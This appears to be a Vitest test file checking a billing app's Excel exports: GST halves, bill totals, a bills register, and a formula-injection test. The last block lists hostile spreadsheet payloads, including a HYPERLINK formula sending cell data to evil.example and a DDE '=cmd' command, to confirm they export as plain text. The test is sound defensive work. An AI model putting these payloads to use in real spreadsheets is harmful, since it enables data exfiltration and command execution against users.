import "./pool";
import { afterAll, beforeAll, describe, expect, it } from "vitest";
import ExcelJS from "exceljs";
import { db } from "@/lib/db";
import { addPayment, createDirectBill, createSummaryBill, getBillDetail, listAllBills, toBillPreviewData } from "@/lib/services/bills";
import { buildBillWorkbook, buildBillsRegisterWorkbook } from "@/lib/services/billExcel";
import { formatCurrency } from "@/lib/utils/currency";
import { cleanupTenant, createTenant, type TestTenant } from "../helpers/tenant";
import { directInput, ok, summaryInput, uniq } from "./helpers";

/**
 * The Excel exports read exact Decimal money and must print the same
 * figures as the stored bill: line amounts, GST halves, the register's
 * column totals.
 */

let t: TestTenant;

beforeAll(async () => {
  t = await createTenant("bill-excel");
});

afterAll(async () => {
  await cleanupTenant(t.businessId);
  await db.$disconnect();
});

function texts(workbook: ExcelJS.Workbook): string[] {
  const out: string[] = [];
  for (const sheet of workbook.worksheets) {
    sheet.eachRow((row) => row.eachCell((cell) => out.push(String(cell.value ?? ""))));
  }
  return out;
}

describe("buildBillWorkbook", () => {
  it("prints a GST direct bill with bucket/breaker amounts, CGST/SGST halves, diesel advance and the grand total", async () => {
    const { bill } = ok(
      await createDirectBill(
        t.businessId,
        t.actor,
        directInput(t, {
          bucketHours: 5.5,
          bucketRate: 1200.25,
          breakerHours: 2,
          breakerRate: 900,
          transportCharges: 250,
          dieselLiters: 20,
          dieselPricePerLiter: 91.35,
          billType: "GST",
          gstPercentage: 18,
          billNumber: `GST-${uniq()}`,
        }),
      ),
    );
    const detail = await getBillDetail(t.businessId, bill.id);
    const preview = toBillPreviewData(detail!);

    // The preview is plain numbers (the client, Excel and print all consume it).
    expect(preview.totalAmount).toBe(8381.63);
    expect(preview.cgst).toBe(778.63);
    expect(preview.sgst).toBe(778.62);
    expect(preview.bucketHours).toBe(5.5);
    expect(typeof preview.subtotal).toBe("number");

    const cells = texts(buildBillWorkbook(preview));
    expect(cells).toContain("Hiring Of Test JCB (TST-1)");
    expect(cells).toContain("Bucket Hours");
    expect(cells).toContain(formatCurrency(6601.38)); // 5.5 x 1200.25 = 6601.375 -> half up
    expect(cells).toContain(formatCurrency(1800)); // breaker 2 x 900
    expect(cells).toContain("CGST (9%)");
    expect(cells).toContain(`+ ${formatCurrency(778.63)}`);
    expect(cells).toContain(`+ ${formatCurrency(778.62)}`);
    expect(cells).toContain(`- ${formatCurrency(1827)}`);
    expect(cells).toContain(formatCurrency(8381.63));
  });

  it("prints a normal bill's lines, charges and total", async () => {
    const { bill } = ok(await createSummaryBill(t.businessId, t.actor, summaryInput(t, { transportCharges: 100, discount: 50.5 })));
    const preview = toBillPreviewData((await getBillDetail(t.businessId, bill.id))!);
    expect(preview.items).toHaveLength(1);
    expect(preview.items[0]).toMatchObject({ hours: 10, ratePerHour: 1000, amount: 10000 });

    const cells = texts(buildBillWorkbook(preview));
    expect(cells).toContain("Transportation");
    expect(cells).toContain("Discount");
    expect(cells).toContain(formatCurrency(10049.5));
  });
});

describe("buildBillsRegisterWorkbook", () => {
  it("lists every bill and prints exact column totals", async () => {
    const tenant = await createTenant("bill-register");
    try {
      const one = ok(await createSummaryBill(tenant.businessId, tenant.actor, summaryInput(tenant))); // 10000
      ok(await addPayment(tenant.businessId, tenant.actor, { billId: one.bill.id, amount: 2500.5, date: "2026-10-03" }));
      ok(
        await createSummaryBill(
          tenant.businessId,
          tenant.actor,
          summaryInput(tenant, {
            items: [{ excavatorId: tenant.excavatorId, siteName: "S2", fromDate: "2026-10-01", toDate: "2026-10-01", hours: 18.8, ratePerHour: 1800.5 }],
          }),
        ),
      ); // 33849.40

      const bills = await listAllBills(tenant.businessId);
      expect(bills).toHaveLength(2);
      const cells = texts(buildBillsRegisterWorkbook(bills, { businessName: "Test Business" }));

      expect(cells).toContain("Test Business — Bills Register");
      expect(cells).toContain("Total Bills: 2");
      expect(cells).toContain(formatCurrency(33849.4)); // one bill's Total cell
      expect(cells).toContain(formatCurrency(2500.5)); // one bill's Paid cell
      // totals row: 10000 + 33849.40 = 43849.40 ; paid 2500.50 ; pending 41348.90
      expect(cells).toContain(formatCurrency(43849.4));
      expect(cells).toContain(formatCurrency(41348.9));
      // per-bill pending: 7499.50 for the part-paid bill
      expect(cells).toContain(formatCurrency(7499.5));
      expect(cells).toContain("PARTIAL");
      expect(cells).toContain("UNPAID");
    } finally {
      await cleanupTenant(tenant.businessId);
    }
  });
});

describe("spreadsheet formula injection", () => {
  const EVIL = ['=HYPERLINK("http://evil.example/?x="&A1,"click")', "+SUM(1+1)", "-2+3", "@SUM(1)", "=cmd|' /C calc'!A0"];

  /** Round-trips through the real .xlsx bytes, so this checks what Excel would open. */
  async function reload(workbook: ExcelJS.Workbook) {
    const buffer = await workbook.xlsx.writeBuffer();
    const loaded = new ExcelJS.Workbook();
    await loaded.xlsx.load(buffer as ArrayBuffer);
    return loaded;
  }

  it("user-controlled text that looks like a formula is stored as text, never as a formula", async () => {
    const tenant = await createTenant("bill-excel-formula");
    try {
      const customer = await db.customer.create({ data: { businessId: tenant.businessId, name: EVIL[0], companyName: EVIL[1], mobile: "9000000001" } });
      const { bill } = ok(
        await createSummaryBill(
          tenant.businessId,
          tenant.actor,
          summaryInput(tenant, {
            customerId: customer.id,
            notes: EVIL[2],
            items: [{ excavatorId: tenant.excavatorId, siteName: EVIL[3], fromDate: "2026-10-01", toDate: "2026-10-01", hours: 1, ratePerHour: 10 }],
          }),
        ),
      );
      await db.bill.update({ where: { id: bill.id }, data: { billNumber: `X-${uniq()}` } });

      const preview = toBillPreviewData((await getBillDetail(tenant.businessId, bill.id))!);
      const register = await listAllBills(tenant.businessId);

      for (const workbook of [buildBillWorkbook(preview), buildBillsRegisterWorkbook(register, { businessName: EVIL[4] })]) {
        const loaded = await reload(workbook);
        let sawEvil = 0;
        for (const sheet of loaded.worksheets) {
          sheet.eachRow((row) =>
            row.eachCell((cell) => {
              expect(cell.type, `cell ${cell.address} must not be a formula`).not.toBe(ExcelJS.ValueType.Formula);
              expect(cell.formula).toBeUndefined();
              if (typeof cell.value === "string" && EVIL.some((e) => cell.value === e || (cell.value as string).includes(e))) sawEvil++;
            }),
          );
        }
        // The hostile text is still shown to the reader (as plain text) rather than dropped.
        expect(sawEvil).toBeGreaterThan(0);
      }
    } finally {
      await cleanupTenant(tenant.businessId);
    }
  });
});
